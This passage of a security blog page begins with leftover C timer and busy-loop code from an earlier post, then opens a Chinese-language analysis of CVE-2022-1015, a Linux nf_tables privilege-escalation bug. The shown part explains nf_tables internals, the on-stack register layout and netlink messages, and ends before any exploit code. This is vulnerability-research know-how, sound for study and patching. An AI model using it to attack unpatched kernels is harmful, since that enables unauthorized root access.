sa.sa_flags = SA_SIGINFO;</span><br><span class="line">    sa.sa_sigaction = timer_handler;</span><br><span class="line">    sigaction(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the timer</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerspec</span> <span class="title">its</span>;</span></span><br><span class="line">    its.it_interval.tv_sec = <span class="number">0</span>;</span><br><span class="line">    its.it_interval.tv_nsec = <span class="number">10000000</span>; <span class="comment">// 100Hz</span></span><br><span class="line">    its.it_value = its.it_interval;</span><br><span class="line">    <span class="keyword">timer_t</span> timerid;</span><br><span class="line">    timer_create(CLOCK_MONOTONIC, <span class="literal">NULL</span>, &amp;timerid);</span><br><span class="line">    timer_settime(timerid, <span class="number">0</span>, &amp;its, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Run a loop to generate some activity</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">						<span class="string">"mov $1, %%rax\n\t"</span> <span class="comment">// Move 1 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $2, %%rax\n\t"</span> <span class="comment">// Move 2 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $3, %%rax\n\t"</span> <span class="comment">// Move 3 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $4, %%rax\n\t"</span> <span class="comment">// Move 4 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $5, %%rax\n\t"</span> <span class="comment">// Move 5 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $6, %%rax\n\t"</span> <span class="comment">// Move 6 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $7, %%rax\n\t"</span> <span class="comment">// Move 7 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $8, %%rax\n\t"</span> <span class="comment">// Move 8 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $9, %%rax\n\t"</span> <span class="comment">// Move 9 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="string">"mov $10, %%rax\n\t"</span> <span class="comment">// Move 10 to rax</span></span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="comment">// No output operand</span></span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="comment">// No input operand</span></span></span></span><br><span class="line"><span class="function"><span class="params">            : <span class="string">"%rax"</span> <span class="comment">// Clobbered register</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line">        <span class="comment">//i = -1; /* 内存写操作 */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2023/03/10/race_windown/" data-id="cmd5slr2m000o0lo1fiscdwzm" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2023/02/06/cve-2022-1015" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2023/02/06/cve-2022-1015/" class="article-date">
  <time datetime="2023-02-06T14:00:00.000Z" itemprop="datePublished">2023-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2023/02/06/cve-2022-1015/">CVE-2022-1015 nf_tables 提权漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: 莫兴远 of <a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener">IceSword Lab</a></p>
<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>CVE-2022-1015 是 Linux 内核 nf_tables 模块的一个漏洞，其成因为没有合理限制整数范围导致栈越界读写。</p>
<p>受该漏洞影响的内核版本范围为 5.12 ~ 5.16 。</p>
<p>该漏洞为此 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e1acfa387b9ff82cfc7db8cc3b6959221a95851" target="_blank" rel="noopener">commit</a> 所修复。</p>
<h1 id="二、漏洞相关知识"><a href="#二、漏洞相关知识" class="headerlink" title="二、漏洞相关知识"></a>二、漏洞相关知识</h1><p>Netfilter 是 Linux 内核一个非常庞大的子系统，它在内核的网络栈中置入多个钩子，并允许其他模块在这些钩子处注册回调函数，当内核执行到钩子处时，所有被注册的回调函数都会被执行。</p>
<p>nf_tables 则是隶属于 Netfilter 子系统的一个模块，它在 Netfitler 的某些钩子处注册了回调函数，以提供网络数据包过滤功能，通常被用于实现防火墙等功能。本文所分析的漏洞就位于 nf_tables 模块中。</p>
<p>在用户态与 nf_tables 交互则是通过 netlink。netlink 是常见的用户态与内核态进行交互的手段，它通过向 AF_NETLINK 类型的 socket 发送数据向内核传递信息，类似地，还可通过从该类型 socket 接收数据以获取内核传递回来的信息。</p>
<h2 id="2-1-nf-tables实现"><a href="#2-1-nf-tables实现" class="headerlink" title="2.1 nf_tables实现"></a>2.1 nf_tables实现</h2><p>nf_tables 允许用户向其注册处理网络数据包的 rule，以决定针对不同类型的数据包该采取哪种行动。多条 rule 被组织在一条 chain 中，多条 chain 则被组织在一个 table 中。不同类型的 chain 会与不同的 Netfilter hook 绑定在一起。当网络数据包到达后，经过内核不同的 hook 时，所有绑定在该 hook 处的 chain 都会被执行，以完成对数据包的处理。在这里，chain 的执行是指其中所有的 rule 被依次执行，rule 的执行则又是指数据包会根据其中拟定的规则确定被采取什么行动，是丢弃、拒绝还是接受。</p>
<p>向 nf_tables 注册 rule 的方式是通过 netlink。由于通过 netlink 向内核发送的数据包过于底层，用户使用起来不方便，开发者提供了用户态工具 nft，方便用户通过更高级的语法拟定规则。</p>
<h3 id="2-1-1-rule"><a href="#2-1-1-rule" class="headerlink" title="2.1.1 rule"></a>2.1.1 rule</h3><p>rule 包含如何处理数据包的逻辑，比如检查数据包的协议、源地址、目标地址、端口等，以分别采取不同的行动。每条 rule 都和一个 verdict 绑定，即每条 rule 都有一个默认的裁定，决定对数据包采取何种行为，是丢弃、拒绝还是接受。举个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp dport 50001 drop</span><br></pre></td></tr></table></figure>

<p>drop 就是该 rule 的 verdict，表示所有目标端口为 50001 的 udp 数据包都会被丢弃。</p>
<h3 id="2-1-2-chain"><a href="#2-1-2-chain" class="headerlink" title="2.1.2 chain"></a>2.1.2 chain</h3><p>chain 是将 rule 组织起来的结构，一条 chain 可包含多条 rule。chain 分为 base chain 和 non-base chain，base chain 是直接绑定到 Netfilter hook 上面的，执行流只会从 base chain 开始。chain 中的 rule 一般都是依次执行完，有时候某条 rule 的 verdict 会让执行流跳转到其他的 chain，从而越过该 chain 中剩下的 rule，但只能跳转到 non-base chain。跳转分两种，一种是跳转后到某条 chain 后就不可以返回了，另一种则是跳转后还可以返回继续执行原来的 chain 剩下的 rule。</p>
<h3 id="2-1-3-table"><a href="#2-1-3-table" class="headerlink" title="2.1.3 table"></a>2.1.3 table</h3><p>table 是 nf_tables 最顶层的结构，它包含多条 chain。chain 只能跳转到同一 table 中的其他 chain。</p>
<p>每个 table 都会从属于某个族，族决定了该 table 会处理哪些种类的数据包。族包括 ip、 ip6、 inet、 arp、 bridge 和 netdev。</p>
<p>属于 ip 族的 table 只负责处理 IPv4 数据包，属于 ip6 族的 table 只负责处理 IPv6 数据包，属于 inet 族的 table 则既可处理 IPv4 又可处理 IPv6 数据包。</p>
<h3 id="2-1-4-expression"><a href="#2-1-4-expression" class="headerlink" title="2.1.4 expression"></a>2.1.4 expression</h3><p>事实上，rule 在层次结构上还可以细分为多个 expression，expression 相当于一条条应用在数据包上的具体指令。用户态工具一般不会涉及到 expression 这个抽象表示，只有内核代码会涉及到。</p>
<p>对于 udp dport 50001 drop 这个规则，需要先通过一个 expression 检查协议是不是  udp，再通过一个 expression 检查端口是不是 50001，如果前面的 expression 都通过了，最后再通过一个 expression 将 verdict 设置为 drop，以将数据包丢弃。</p>
<p>每种 expression 会和一个 struct nft_expr_ops 实例绑定，比如 immediate 这个 expression：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_imm_ops</span> = &#123;</span></span><br><span class="line">	.type		= &amp;nft_imm_type, <span class="comment">// expression 类型</span></span><br><span class="line">	.<span class="built_in">size</span>		= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_immediate_expr)),</span><br><span class="line">	.eval		= nft_immediate_eval, <span class="comment">// 当 expression 被执行时调用</span></span><br><span class="line">	.init		= nft_immediate_init, <span class="comment">// 当 expression 被初始化时调用</span></span><br><span class="line">	.activate	= nft_immediate_activate,</span><br><span class="line">	.deactivate	= nft_immediate_deactivate,</span><br><span class="line">	.destroy	= nft_immediate_destroy,</span><br><span class="line">	.dump		= nft_immediate_dump,</span><br><span class="line">	.validate	= nft_immediate_validate,</span><br><span class="line">	.reduce		= nft_immediate_reduce,</span><br><span class="line">	.offload	= nft_immediate_offload,</span><br><span class="line">	.offload_action	= nft_immediate_offload_action,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每次当一条 rule 被添加进来，其所有 expression 的 init 函数都会被调用。</p>
<p>当某个 expression 被执行时，其 eval 函数会被调用。</p>
<h3 id="2-1-5-register"><a href="#2-1-5-register" class="headerlink" title="2.1.5 register"></a>2.1.5 register</h3><p>expression 在操作数据包时，需要内存来记录一些数据，这部分内存就是 register。在内核的实现中，所有 register 都在栈上，且在内存地址上是连续的。</p>
<p>expression 可以读取或修改 register 的数据，单次访问的对象既可以是单个 register，也可以是连续的多个 register，因此 register 可以看做是一块连续的缓冲区。</p>
<p>register 可通过 index 索引，以下是内核中定义的 register 的 index：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> nft_registers &#123;</span><br><span class="line">	NFT_REG_VERDICT,</span><br><span class="line">	NFT_REG_1,</span><br><span class="line">	NFT_REG_2,</span><br><span class="line">	NFT_REG_3,</span><br><span class="line">	NFT_REG_4,</span><br><span class="line">	__NFT_REG_MAX,</span><br><span class="line"></span><br><span class="line">	NFT_REG32_00	= <span class="number">8</span>,</span><br><span class="line">	NFT_REG32_01,</span><br><span class="line">	NFT_REG32_02,</span><br><span class="line">	...</span><br><span class="line">	NFT_REG32_13,</span><br><span class="line">	NFT_REG32_14,</span><br><span class="line">	NFT_REG32_15,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>register 有两种索引方式。NFT_REG_1 到 NFT_REG_4 是一种，共 4 个 register，每个 16 字节；NFT_REG32_00 到 NFT_REG32_15 是另一种，共 16 个 reigster，每个 4 字节。在两种索引方式中，NFT_REG_VERDICT 都指向 verdict register，大小为 16 字节。两种索引方式针对的都是同一片内存，因此内存总数都是 16 + 4 * 16 = 16 + 16 * 4 = 80 字节。</p>
<p><img src="images/01.png" alt></p>
<p>verdict register 在内存上位于最前，每条 rule 执行完后都会设置好 verdict register，以决定下一步该怎么执行。verdict register 可以设置成以下值：</p>
<table>
<thead>
<tr>
<th>verdict</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>NFT_CONTINUE</td>
<td>默认 verdict，继续执行下一个 expression。</td>
</tr>
<tr>
<td>NFT_BREAK</td>
<td>跳过该 rule 剩下的 expression，继续执行下一条 rule。</td>
</tr>
<tr>
<td>NF_DROP</td>
<td>丢弃数据包，停止执行。</td>
</tr>
<tr>
<td>NF_ACCEPT</td>
<td>接受数据包，停止执行。</td>
</tr>
<tr>
<td>NFT_GOTO</td>
<td>跳转到另一条 chain，且不再返回。</td>
</tr>
<tr>
<td>NFT_JUMP</td>
<td>跳转到另一条 chain，执行完该 chain 后，若 verdict 为 NFT_CONTINUE，则返回原本的 chain 继续执行。</td>
</tr>
</tbody></table>
<h3 id="2-1-6-nft-do-chain"><a href="#2-1-6-nft-do-chain" class="headerlink" title="2.1.6 nft_do_chain"></a>2.1.6 nft_do_chain</h3><p>nft_do_chain 实现了依次执行所有 base chain 中所有 rule 的所有 expression 的逻辑，以下是添加了许多说明性注释的该函数的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">nft_do_chain(struct nft_pktinfo *pkt, <span class="keyword">void</span> *priv)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> = <span class="title">priv</span>, *<span class="title">basechain</span> = <span class="title">chain</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_dp</span> *<span class="title">rule</span>, *<span class="title">last_rule</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">nft_net</span>(<span class="title">pkt</span>);</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>, *<span class="title">last</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> stackptr = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_jumpstack</span> <span class="title">jumpstack</span>[<span class="title">NFT_JUMP_STACK_SIZE</span>];</span></span><br><span class="line">	<span class="keyword">bool</span> genbit = READ_ONCE(net-&gt;nft.gencursor);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span> *<span class="title">blob</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_traceinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">	info.trace = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;nft_trace_enabled))</span><br><span class="line">		nft_trace_init(&amp;info, pkt, &amp;regs.verdict, basechain);</span><br><span class="line">do_chain:</span><br><span class="line">	<span class="keyword">if</span> (genbit)</span><br><span class="line">		blob = rcu_dereference(chain-&gt;blob_gen_1);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		blob = rcu_dereference(chain-&gt;blob_gen_0);</span><br><span class="line"></span><br><span class="line">	rule = (struct nft_rule_dp *)blob-&gt;data;</span><br><span class="line">	<span class="comment">/* 获取最后一条 rule 的位置，以确定循环的停止条件 */</span></span><br><span class="line">	last_rule = (<span class="keyword">void</span> *)blob-&gt;data + blob-&gt;<span class="built_in">size</span>;</span><br><span class="line">next_rule: <span class="comment">// 执行到一条新的 chain，或返回到原来的 chain，都从这里开始</span></span><br><span class="line">	regs.verdict.code = NFT_CONTINUE; <span class="comment">// the default verdict code = NFT_CONTINUE</span></span><br><span class="line">	<span class="keyword">for</span> (; rule &lt; last_rule; rule = nft_rule_next(rule)) &#123; <span class="comment">// iterate through the rules</span></span><br><span class="line">		<span class="comment">/* iterate through the expressions */</span></span><br><span class="line">		nft_rule_dp_for_each_expr(expr, last, rule) &#123;</span><br><span class="line">			<span class="comment">// execute the expression</span></span><br><span class="line">			<span class="keyword">if</span> (expr-&gt;ops == &amp;nft_cmp_fast_ops)</span><br><span class="line">				nft_cmp_fast_eval(expr, &amp;regs);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops == &amp;nft_cmp16_fast_ops)</span><br><span class="line">				nft_cmp16_fast_eval(expr, &amp;regs);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops == &amp;nft_bitwise_fast_ops)</span><br><span class="line">				nft_bitwise_fast_eval(expr, &amp;regs);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (expr-&gt;ops != &amp;nft_payload_fast_ops ||</span><br><span class="line">				 !nft_payload_fast_eval(expr, &amp;regs, pkt))</span><br><span class="line">				expr_call_ops_eval(expr, &amp;regs, pkt);</span><br><span class="line">			<span class="comment">/* 如果 verdict 不是 NFT_CONTINUE， 停止执行该 rule 接下来的 expression */</span></span><br><span class="line">			<span class="keyword">if</span> (regs.verdict.code != NFT_CONTINUE) </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 已执行完一条 rule，检查 verdict，</span></span><br><span class="line">    <span class="comment">// 如果不是 NFT_BREAK 或 NFT_CONTINUE，停止执行该 chain 剩下的 rule</span></span><br><span class="line">		<span class="keyword">switch</span> (regs.verdict.code) &#123; </span><br><span class="line">		<span class="keyword">case</span> NFT_BREAK: </span><br><span class="line">			<span class="comment">// 若为 NFT_BREAK，则将 verdict 设置回 NFT_CONTINUE。</span></span><br><span class="line">			<span class="comment">// NFT_BREAK 和 NFT_CONTINUE 类似，都会执行下一条 rule，</span></span><br><span class="line">      <span class="comment">// 只是 NFT_BREAK 会跳过当前 rule 剩下的 expression。</span></span><br><span class="line">			regs.verdict.code = NFT_CONTINUE;</span><br><span class="line">			nft_trace_copy_nftrace(pkt, &amp;info);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">case</span> NFT_CONTINUE:</span><br><span class="line">			<span class="comment">// 执行到这里代表执行完了当前 rule 的所有 expression，</span></span><br><span class="line">      <span class="comment">// 继续执行下一条 rule 即可。</span></span><br><span class="line">			nft_trace_packet(pkt, &amp;info, chain, rule,</span><br><span class="line">					 NFT_TRACETYPE_RULE);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 若 verdict 不是 NFT_BREAK 或 NFT_CONTINUE，</span></span><br><span class="line">    <span class="comment">// 代表即将跳过该 chain 剩下的 rule，停止该 chain 的执行。</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nft_trace_verdict(&amp;info, chain, rule, &amp;regs);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 执行到这里代表执行完了某条 chain，</span></span><br><span class="line">  <span class="comment">// 将根据 verdict 决定采取的行动</span></span><br><span class="line">	<span class="keyword">switch</span> (regs.verdict.code &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line">	<span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line">	<span class="keyword">case</span> NF_DROP:</span><br><span class="line">	<span class="keyword">case</span> NF_QUEUE:</span><br><span class="line">	<span class="keyword">case</span> NF_STOLEN:</span><br><span class="line">		<span class="comment">// 已经决定好对当前数据包的处理，退出函数即可。</span></span><br><span class="line">		<span class="keyword">return</span> regs.verdict.code;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 尚未决定好对数据包的处理，继续执行。</span></span><br><span class="line">	<span class="keyword">switch</span> (regs.verdict.code) &#123;</span><br><span class="line">	<span class="keyword">case</span> NFT_JUMP: </span><br><span class="line">		<span class="comment">// 跳转到另一条 chain，将返回时需要的信息保存到 jumpstack 上</span></span><br><span class="line">    <span class="comment">// 返回后，执行的是当前 rule 的下一条 rule</span></span><br><span class="line">		<span class="keyword">if</span> (WARN_ON_ONCE(stackptr &gt;= NFT_JUMP_STACK_SIZE))</span><br><span class="line">			<span class="keyword">return</span> NF_DROP;</span><br><span class="line">		jumpstack[stackptr].chain = chain;</span><br><span class="line">		jumpstack[stackptr].rule = nft_rule_next(rule);</span><br><span class="line">		jumpstack[stackptr].last_rule = last_rule;</span><br><span class="line">		stackptr++;</span><br><span class="line">		fallthrough;</span><br><span class="line">	<span class="keyword">case</span> NFT_GOTO:</span><br><span class="line">		<span class="comment">// 跳转到另一条 chain，不再返回</span></span><br><span class="line">		chain = regs.verdict.chain;</span><br><span class="line">		<span class="keyword">goto</span> do_chain;</span><br><span class="line">	<span class="keyword">case</span> NFT_CONTINUE: <span class="comment">// 执行下一条 chain</span></span><br><span class="line">	<span class="keyword">case</span> NFT_RETURN: <span class="comment">// 返回到上一次跳转前的 chain</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nft_base_chain(basechain)-&gt;policy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每执行完一个 expression、一条 rule 或 一条 chain 时，都会检查 verdict register。</p>
<p>执行完一个 expression 时，非 NFT_CONTINUE 的 verdict 会阻止该条 rule 剩下的 expression 的执行。</p>
<p>执行完一条 rule 时，非 NFT_BREAK 或 NFT_CONTINUE 的 verdict 会阻止该 chain 剩下的 rule 的执行。</p>
<p>执行完一条 chain 时，如果已经决定对数据包的处理，则停止执行。否则，根据 verdict 决定流程如何跳转。</p>
<h3 id="2-1-7-expression种类"><a href="#2-1-7-expression种类" class="headerlink" title="2.1.7 expression种类"></a>2.1.7 expression种类</h3><p>以下是常见的一些 expression 类型及其功能的简单描述：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>nft_immediate_expr</td>
<td>将一个常数保存进 register。</td>
</tr>
<tr>
<td>nft_payload</td>
<td>从数据包提取数据保存进 register。</td>
</tr>
<tr>
<td>nft_payload_set</td>
<td>将数据包的某部分数据设置成 register 中的数据。</td>
</tr>
<tr>
<td>nft_cmp_expr</td>
<td>比较 register 中的数据和某个常数，根据结果决定是否修改执行流。</td>
</tr>
<tr>
<td>nft_bitwise</td>
<td>对 register 中数据进行位操作，比如左移、亦或。</td>
</tr>
<tr>
<td>nft_range_expr</td>
<td>和 nft_cmp_expr 类似，但比较的是更大范围的数据，可跨越多个 register。</td>
</tr>
</tbody></table>
<h2 id="2-2-netlink"><a href="#2-2-netlink" class="headerlink" title="2.2 netlink"></a>2.2 netlink</h2><p>和 nf_table 进行交互需要通过 netlink。netlink 是 Linux 系统中和内核通信的常用方式，特别是在网络模块中使用率很高，它的设计是为了克服 ioctl 的一些缺点。</p>
<p>和 netlink 通信需要利用 AF_NETLINK 族的 socket。所有需要使用 netlink 的内核模块都要实现一个 protocal，nf_tables 则是实现了 NETLINK_NETFILTER 这一 protocal。因此，为了和 nf_tables 通信，只需要创建以下 socket：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);</span><br></pre></td></tr></table></figure>

<p>当创建相应的 netlink socket 时，netlink 还会自动加载相应的模块，只要 modprobe 和 .ko 文件存放在合适的位置。</p>
<p>创建 socket 之后，就可通过 sendmsg 向 socket 发送消息，通过 recvmsg 从 socket 接收消息，从而实现和 nf_tables 通信。</p>
<p>sendmsg 的消息格式是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> &#123;</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_name;       <span class="comment">/* Optional address */</span></span><br><span class="line">   <span class="keyword">socklen_t</span>     msg_namelen;    <span class="comment">/* Size of address */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">msg_iov</span>;</span>        <span class="comment">/* Scatter/gather array */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_iovlen;     <span class="comment">/* # elements in msg_iov */</span></span><br><span class="line">   <span class="keyword">void</span>         *msg_control;    <span class="comment">/* Ancillary data, see below */</span></span><br><span class="line">   <span class="keyword">size_t</span>        msg_controllen; <span class="comment">/* Ancillary data buffer len */</span></span><br><span class="line">   <span class="keyword">int</span>           msg_flags;      <span class="comment">/* Flags (unused) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>消息的内容存放在 msg_iov 字段指向的 iovec 数组中。</p>
<p>发送 netlink 消息时，iovec 数组指向 struct nlmsghdr 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">	__u32		nlmsg_len;	<span class="comment">/* Length of message including header */</span></span><br><span class="line">	__u16		nlmsg_type;	<span class="comment">/* Message content */</span></span><br><span class="line">	__u16		nlmsg_flags;	<span class="comment">/* Additional flags */</span></span><br><span class="line">	__u32		nlmsg_seq;	<span class="comment">/* Sequence number */</span></span><br><span class="line">	__u32		nlmsg_pid;	<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>struct nlmsghdr 之后通常紧跟特定 protocol 定义的协议头部，不同 protocal 的协议头部差异很大。</p>
<p>协议头部之后是多个属性，属性的头部是以下结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">	__u16           nla_len;</span><br><span class="line">	__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>属性的实际内容则紧跟在头部之后。</p>
